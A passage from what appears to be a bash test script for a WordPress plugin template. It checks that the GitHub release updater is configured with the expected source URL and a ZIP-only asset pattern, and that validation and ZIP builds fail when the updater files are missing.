}

$built = \YahnisElsts\PluginUpdateChecker\v5\PucFactory::$built[0];
if ( 'https://github.com/example/standard-plugin' !== $built[0] || 'standard-plugin' !== $built[2] ) {
  fwrite( STDERR, "Runtime updater passed unexpected source URL or slug into PUC.\n" );
  exit( 1 );
}

if ( '/\\.zip($|[?&#])/i' !== ( $GLOBALS['wp_plugin_base_runtime_updater_asset_pattern'] ?? '' ) ) {
  fwrite( STDERR, "Runtime updater did not restrict release assets to ZIP files.\n" );
  exit( 1 );
}
PHP

updater_missing_require_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$updater_missing_require_fixture/"
cat >> "$updater_missing_require_fixture/.wp-plugin-base.env" <<'EOF_CONFIG'
GITHUB_RELEASE_UPDATER_ENABLED=true
GITHUB_RELEASE_UPDATER_REPO_URL=https://github.com/example/standard-plugin
EOF_CONFIG
mkdir -p "$updater_missing_require_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$updater_missing_require_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$updater_missing_require_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if WP_PLUGIN_BASE_ROOT="$updater_missing_require_fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" >/dev/null 2>&1; then
  echo "Project validation unexpectedly passed without the required updater include line." >&2
  exit 1
fi

updater_missing_runtime_fixture="$(mktemp -d)"
cp -R "$updater_fixture/." "$updater_missing_runtime_fixture/"
rm -rf "$updater_missing_runtime_fixture/lib/wp-plugin-base/plugin-update-checker"
if WP_PLUGIN_BASE_ROOT="$updater_missing_runtime_fixture" bash "$ROOT_DIR/scripts/ci/build_zip.sh" >/dev/null 2>&1; then
  echo "build_zip unexpectedly passed with updater runtime directory removed." >&2
  exit 1
fi
